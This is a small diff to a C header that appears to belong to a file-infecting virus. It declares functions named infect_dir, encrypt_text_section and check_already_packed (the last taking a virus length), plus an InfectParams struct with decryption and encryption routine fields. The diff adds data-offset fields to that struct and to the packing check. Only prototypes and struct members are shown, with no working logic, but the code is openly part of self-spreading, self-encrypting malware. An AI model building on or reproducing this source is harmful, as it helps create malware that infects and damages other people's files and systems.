@@ -17,7 +17,7 @@ int encrypt_text_section(char *s, size_t n);
 
 //=============================================================
 
-int check_already_packed(char *s, size_t n, size_t virus_len);
+int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_off);
 
 typedef struct s_opt {
 	char do_recur;
@@ -35,6 +35,8 @@ typedef struct s_infect_params {
 	size_t crypt_len;
 	size_t decrypt_routine_off;
 	void (*encrypt_routine)(char *s, uint64_t n, uint64_t k[2]);
+	size_t data_off;
+	size_t dataearly_off;
 } InfectParams;
 
 int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
